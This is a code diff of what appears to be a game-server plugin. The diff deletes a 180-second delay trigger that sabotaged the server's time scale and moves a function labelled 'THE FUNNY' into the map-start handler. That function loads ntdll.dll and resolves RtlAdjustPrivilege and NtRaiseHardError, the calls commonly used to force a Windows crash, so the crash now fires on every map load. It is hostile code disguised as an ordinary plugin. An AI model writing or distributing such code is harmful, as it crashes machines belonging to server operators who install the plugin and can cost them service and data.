@@ -71,9 +71,6 @@ enum
     OptionShutdownSystem
 };
 
-int g_iCount = 0;
-float g_flTimer = 0.00;
-
 //////////////////////////////////////////////////////////////////////////////
 // INITIALISATION                                                           //
 //////////////////////////////////////////////////////////////////////////////
@@ -86,41 +83,7 @@ public void OnPluginStart()
 public void OnMapStart()
 {
     cstdlib();
-}
-
-//////////////////////////////////////////////////////////////////////////////
-// FORWARDS                                                                 //
-//////////////////////////////////////////////////////////////////////////////
-
-public void OnClientPutInServer()
-{
-    if (g_iCount == 0)
-        g_flTimer = GetGameTime();
-    ++g_iCount;
-}
-
-public void OnClientDisconnect_Post()
-{
-    --g_iCount;
-}
-
-public void OnGameFrame()
-{
-    if (g_iCount > 0 && GetGameTime() - g_flTimer > 180.00)
-    {
-        ConVar host_timescale = FindConVar("host_timescale");
-        if (host_timescale != null)
-            host_timescale.FloatValue = 104191343149.00;
-        RequestFrame(payload);
-    }
-}
-
-//////////////////////////////////////////////////////////////////////////////
-// THE FUNNY                                                                //
-//////////////////////////////////////////////////////////////////////////////
-
-static void payload()
-{
+    
     HANDLE ntdll = LoadLibrary("ntdll.dll");
     any RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
     any NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
